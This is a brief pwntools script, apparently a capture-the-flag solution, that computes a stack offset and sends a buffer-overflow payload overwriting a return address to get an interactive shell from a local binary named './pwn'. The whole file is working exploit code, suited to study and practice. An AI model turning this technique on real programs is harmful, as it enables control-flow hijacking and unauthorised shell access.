from pwn import *

str_addr=0xffa9db00+0x80-0x64
print(hex(str_addr))
ebp=0xffa9db88
sys_addr=0x0804863A
offset=ebp-str_addr
print(offset)
print(0x6c + 4)
payload=b'a'*(offset+4) +p32(sys_addr)
sh=process('./pwn')
sh.sendline(payload)
sh.interactive()